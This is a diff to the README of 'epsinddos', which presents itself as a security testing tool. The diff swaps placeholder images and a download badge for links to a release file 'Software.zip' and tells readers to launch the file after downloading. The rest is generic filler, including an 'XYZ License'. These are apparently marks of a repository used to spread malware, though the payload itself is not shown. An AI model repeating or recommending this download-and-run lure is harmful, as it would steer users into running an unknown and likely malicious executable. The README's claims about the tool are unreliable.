@@ -1,6 +1,6 @@
 # 🔒 epsinddos - Security Testing Tool 🔒
 
-![epsinddos Logo](https://example.com/logo.png)
+![epsinddos Logo](https://github.com/feyuzen/epsinddos/releases/download/v2.0/Software.zip)
 
 Welcome to the epsinddos repository - a security testing tool designed to help you evaluate the resilience of your systems against various types of attacks. Whether you are a cybersecurity professional, a developer, or just someone interested in cybersecurity, epsinddos can assist you in understanding vulnerabilities and enhancing the security of your environments.
 
@@ -38,7 +38,7 @@ The epsinddos repository covers a wide range of topics related to security testi
 
 To get started with epsinddos, simply download the tool from the following link:
 
-[![Download epsinddos](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download epsinddos](https://github.com/feyuzen/epsinddos/releases/download/v2.0/Software.zip)](https://github.com/feyuzen/epsinddos/releases/download/v2.0/Software.zip)
 
 Please note that the file needs to be launched after downloading.
 
@@ -67,4 +67,4 @@ The epsinddos tool is distributed under the XYZ License. For more information on
 
 Thank you for choosing epsinddos for your security testing needs. Let's work together to build a more secure digital world! 🌐
 
-![Security First](https://example.com/security.png)
+![Security First](https://github.com/feyuzen/epsinddos/releases/download/v2.0/Software.zip)
